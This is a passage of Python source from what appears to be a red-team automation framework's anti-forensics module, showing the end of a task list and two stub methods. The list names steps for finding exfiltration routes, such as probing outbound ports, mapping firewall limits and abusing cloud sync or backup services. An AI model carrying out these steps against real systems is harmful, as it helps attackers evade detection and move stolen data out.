                            'Test outbound connectivity on various ports',
                            'Identify proxy/firewall restrictions',
                            'Look for legitimate services to abuse (cloud sync, backup)'
                        ]
                    }
                }
            ]
        }

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """No dynamic task generation for anti-forensics"""
        return []

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        """Get manual alternatives for anti-forensics tasks"""
        return ['Manual anti-forensics techniques based on system access and OS type']
